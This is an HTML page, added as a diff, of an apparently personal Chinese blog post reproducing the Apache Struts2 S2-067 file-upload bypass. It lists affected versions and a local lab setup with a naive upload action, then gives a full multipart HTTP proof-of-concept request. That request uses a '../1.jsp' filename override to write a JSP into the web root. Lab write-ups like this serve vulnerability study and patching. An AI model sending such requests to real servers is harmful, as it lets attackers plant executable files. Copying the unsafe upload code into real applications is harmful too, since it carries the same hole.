@@ -1,0 +1,683 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="hexi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x01简介 Apache Struts2 是一个流行的 Java Web 应用程序框架，广泛用于开发企业级应用。该漏洞出现在 Struts2 的文件上传功能中，由于缺乏对上传文件类型的严格验证，攻击者可以绕过文件类型过滤规则，上传恶意文件，从而在目标系统上执行任意代码或开展进一步的攻击。   0x02漏洞概述FileUploadInterceptor在处理文件上传时可绕过文件类型验证 0x03漏">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apache Struts2文件上传逻辑漏洞S2-067">
+<meta property="og:url" content="http://example.com/2025/03/22/Apache-Struts2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9ES2-067/index.html">
+<meta property="og:site_name" content="hexi的个人博客">
+<meta property="og:description" content="0x01简介 Apache Struts2 是一个流行的 Java Web 应用程序框架，广泛用于开发企业级应用。该漏洞出现在 Struts2 的文件上传功能中，由于缺乏对上传文件类型的严格验证，攻击者可以绕过文件类型过滤规则，上传恶意文件，从而在目标系统上执行任意代码或开展进一步的攻击。   0x02漏洞概述FileUploadInterceptor在处理文件上传时可绕过文件类型验证 0x03漏">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/03/22/Apache-Struts2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9ES2-067/1734665123517-5e1439ea-6039-46eb-8e39-28b8ed363dfb.png">
+<meta property="og:image" content="http://example.com/2025/03/22/Apache-Struts2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9ES2-067/1734665137663-5bf6873a-ac3b-4e54-89c4-c11b3504b016.png">
+<meta property="og:image" content="http://example.com/2025/03/22/Apache-Struts2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9ES2-067/1734619912639-5155e829-e5cb-4650-8a8b-9f5cd2acc294.png">
+<meta property="og:image" content="http://example.com/2025/03/22/Apache-Struts2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9ES2-067/1734625785344-83c8c8a1-3808-46b2-af0e-a6f5e453d5c0.png">
+<meta property="og:image" content="http://example.com/2025/03/22/Apache-Struts2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9ES2-067/1734625866932-16eb70cf-40f5-46c0-9a2e-83dd09d5cb92.png">
+<meta property="og:image" content="http://example.com/2025/03/22/Apache-Struts2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9ES2-067/1734626442075-98b5ae5c-2c27-42c7-bfe1-9755b06b3b37.png">
+<meta property="og:image" content="http://example.com/2025/03/22/Apache-Struts2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9ES2-067/1734626514638-99d8f218-0c9a-4486-a71a-fdae77dc92e5.png">
+<meta property="og:image" content="http://example.com/2025/03/22/Apache-Struts2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9ES2-067/1734626551793-b4619cdf-af30-4917-a523-8f394f88b800.png">
+<meta property="article:published_time" content="2025-03-22T10:46:54.000Z">
+<meta property="article:modified_time" content="2025-03-22T11:13:20.483Z">
+<meta property="article:author" content="hexi">
+<meta property="article:tag" content="Apache">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2025/03/22/Apache-Struts2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9ES2-067/1734665123517-5e1439ea-6039-46eb-8e39-28b8ed363dfb.png">
+  
+  
+  
+  <title>Apache Struts2文件上传逻辑漏洞S2-067 - hexi的个人博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Apache Struts2文件上传逻辑漏洞S2-067"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-22 18:46" pubdate>
+          2025年3月22日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          12 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Apache Struts2文件上传逻辑漏洞S2-067</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="0x01简介"><a href="#0x01简介" class="headerlink" title="0x01简介"></a>0x01简介</h2><p> Apache Struts2 是一个流行的 Java Web 应用程序框架，广泛用于开发企业级应用。该漏洞出现在 Struts2 的文件上传功能中，由于缺乏对上传文件类型的严格验证，攻击者可以绕过文件类型过滤规则，上传恶意文件，从而在目标系统上执行任意代码或开展进一步的攻击。  </p>
+<h2 id="0x02漏洞概述"><a href="#0x02漏洞概述" class="headerlink" title="0x02漏洞概述"></a>0x02漏洞概述</h2><p>FileUploadInterceptor在处理文件上传时可绕过文件类型验证</p>
+<h2 id="0x03漏洞版本"><a href="#0x03漏洞版本" class="headerlink" title="0x03漏洞版本"></a>0x03漏洞版本</h2><p>Struts 2.0.0 - Struts 2.3.37（EOL）<br>Struts 2.5.0 - Struts 2.5.33<br>Struts 6.0.0 - Struts 6.3.0.2</p>
+<h2 id="0x04环境搭建"><a href="#0x04环境搭建" class="headerlink" title="0x04环境搭建"></a>0x04环境搭建</h2><p>idea打开源码，选择本地tomcat，在Deployment中如图所示部署</p>
+<p>pom.xml和相关代码</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>untitled<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>war<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>untitled Maven Webapp<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>http://maven.apache.org<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.8.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.struts<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>struts2-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>6.3.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">finalName</span>&gt;</span>untitled<span class="hljs-tag">&lt;/<span class="hljs-name">finalName</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs arduino">package com.struts2;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork<span class="hljs-number">2.</span>ActionSupport;<br><span class="hljs-keyword">import</span> org.apache.commons.io.FileUtils;<br><span class="hljs-keyword">import</span> org.apache.struts<span class="hljs-number">2.</span>ServletActionContext;<br><br><span class="hljs-keyword">import</span> java.io.<span class="hljs-built_in">File</span>;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UploadsAction</span> extends ActionSupport &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> serialVersionUID = <span class="hljs-number">1L</span>;<br><br>    <span class="hljs-keyword">private</span> List&lt;<span class="hljs-built_in">File</span>&gt; upload; <span class="hljs-comment">// 上传的文件列表</span><br>    <span class="hljs-keyword">private</span> List&lt;<span class="hljs-type">String</span>&gt; uploadContentType; <span class="hljs-comment">// 上传文件的内容类型</span><br>    <span class="hljs-keyword">private</span> List&lt;<span class="hljs-type">String</span>&gt; uploadFileName; <span class="hljs-comment">// 上传文件的名称</span><br>    <span class="hljs-keyword">private</span> List&lt;<span class="hljs-type">String</span>&gt; uploadedFileNames = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayList</span>&lt;<span class="hljs-type">String</span>&gt;(); <span class="hljs-comment">// 存储已上传文件的名称</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;<span class="hljs-built_in">File</span>&gt; <span class="hljs-title">getUpload</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> upload;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">setUpload</span><span class="hljs-params">(List&lt;<span class="hljs-built_in">File</span>&gt; upload)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.upload = upload;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;<span class="hljs-type">String</span>&gt; <span class="hljs-title">getUploadContentType</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> uploadContentType;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">setUploadContentType</span><span class="hljs-params">(List&lt;<span class="hljs-type">String</span>&gt; uploadContentType)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.uploadContentType = uploadContentType;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;<span class="hljs-type">String</span>&gt; <span class="hljs-title">getUploadFileName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> uploadFileName;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">setUploadFileName</span><span class="hljs-params">(List&lt;<span class="hljs-type">String</span>&gt; uploadFileName)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.uploadFileName = uploadFileName;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;<span class="hljs-type">String</span>&gt; <span class="hljs-title">getUploadedFileNames</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> uploadedFileNames;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-title">doUpload</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-comment">// 使用相对路径</span><br>        <span class="hljs-type">String</span> relativePath = <span class="hljs-string">&quot;upload&quot;</span>; <span class="hljs-comment">// 上传目录</span><br>        <span class="hljs-type">String</span> realPath = ServletActionContext.<span class="hljs-built_in">getServletContext</span>().<span class="hljs-built_in">getRealPath</span>(relativePath); <span class="hljs-comment">// 获取绝对路径</span><br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;上传文件的绝对路径: &quot;</span> + realPath);<br><br>        <span class="hljs-comment">// 创建目标目录（如果不存在）</span><br>        <span class="hljs-built_in">File</span> uploadDir = <span class="hljs-keyword">new</span> <span class="hljs-built_in">File</span>(realPath);<br>        <span class="hljs-keyword">if</span> (!uploadDir.<span class="hljs-built_in">exists</span>()) &#123;<br>            uploadDir.<span class="hljs-built_in">mkdirs</span>(); <span class="hljs-comment">// 创建目录</span><br>        &#125;<br><br>        <span class="hljs-comment">// 文件上传逻辑</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; upload.<span class="hljs-built_in">size</span>(); i++) &#123;<br>                <span class="hljs-built_in">File</span> destFile = <span class="hljs-keyword">new</span> <span class="hljs-built_in">File</span>(uploadDir, uploadFileName.<span class="hljs-built_in">get</span>(i)); <span class="hljs-comment">// 目标文件</span><br>                FileUtils.<span class="hljs-built_in">copyFile</span>(upload.<span class="hljs-built_in">get</span>(i), destFile); <span class="hljs-comment">// 复制文件</span><br>                uploadedFileNames.<span class="hljs-built_in">add</span>(uploadFileName.<span class="hljs-built_in">get</span>(i)); <span class="hljs-comment">// 添加到已上传文件列表</span><br>            &#125;<br>        &#125; <span class="hljs-built_in">catch</span> (Exception e) &#123;<br>            e.<span class="hljs-built_in">printStackTrace</span>(); <span class="hljs-comment">// 打印异常</span><br>            <span class="hljs-keyword">return</span> ERROR; <span class="hljs-comment">// 返回错误</span><br>        &#125;<br><br>        <span class="hljs-keyword">return</span> SUCCESS; <span class="hljs-comment">// 返回成功</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="1734665123517-5e1439ea-6039-46eb-8e39-28b8ed363dfb.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>运行，访问<a target="_blank" rel="noopener" href="http://localhost:8080/untitled_war/">http://localhost:8080/untitled_war/</a></p>
+<p><img src="1734665137663-5bf6873a-ac3b-4e54-89c4-c11b3504b016.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="1734619912639-5155e829-e5cb-4650-8a8b-9f5cd2acc294.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h2><p>利用poc上传一个测试jsp，利用路径穿越到web根目录</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs powershell">POST /untitled_war/uploads.action HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">0.116</span>:<span class="hljs-number">8080</span><br>User<span class="hljs-literal">-Agent</span>: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; <span class="hljs-built_in">rv</span>:<span class="hljs-number">132.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">132.0</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,*/*;q=<span class="hljs-number">0.8</span><br>Accept<span class="hljs-literal">-Language</span>: zh<span class="hljs-literal">-CN</span>,zh;q=<span class="hljs-number">0.8</span>,zh<span class="hljs-literal">-TW</span>;q=<span class="hljs-number">0.7</span>,zh<span class="hljs-literal">-HK</span>;q=<span class="hljs-number">0.5</span>,en<span class="hljs-literal">-US</span>;q=<span class="hljs-number">0.3</span>,en;q=<span class="hljs-number">0.2</span><br>Accept<span class="hljs-literal">-Encoding</span>: gzip, deflate, br<br>Referer: http://<span class="hljs-number">172.16</span>.<span class="hljs-number">65.98</span>:<span class="hljs-number">8080</span>/untitled_war/<br>Content<span class="hljs-literal">-Type</span>: multipart/form<span class="hljs-literal">-data</span>; boundary=<span class="hljs-literal">---------------------------376058448320617365003265882680</span><br>Content<span class="hljs-literal">-Length</span>: <span class="hljs-number">529</span><br>Origin: http://<span class="hljs-number">192.168</span>.<span class="hljs-number">0.116</span>:<span class="hljs-number">8080</span><br>Connection: close<br>Cookie: JSESSIONID=<span class="hljs-number">953590</span>EEDDD585B3CFE1A15E18C518C9<br>Upgrade<span class="hljs-literal">-Insecure-Requests</span>: <span class="hljs-number">1</span><br>Priority: u=<span class="hljs-number">0</span>, i<br><br><span class="hljs-literal">-----------------------------376058448320617365003265882680</span><br>Content<span class="hljs-literal">-Disposition</span>: form<span class="hljs-literal">-data</span>; name=<span class="hljs-string">&quot;Upload&quot;</span>; filename=<span class="hljs-string">&quot;1.txt&quot;</span><br>Content<span class="hljs-literal">-Type</span>: application/octet<span class="hljs-literal">-stream</span><br><br>&lt;%<span class="hljs-selector-tag">@</span> page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br><br>&lt;body&gt;<br>    &lt;p&gt;test&lt;/p&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br><br><br><br><span class="hljs-literal">-----------------------------376058448320617365003265882680</span><br>Content<span class="hljs-literal">-Disposition</span>: form<span class="hljs-literal">-data</span>; name=<span class="hljs-string">&quot;uploadFileName[0]&quot;</span>;<br><br>../<span class="hljs-number">1</span>.jsp<br><span class="hljs-literal">-----------------------------376058448320617365003265882680--</span><br></code></pre></td></tr></table></figure>
+
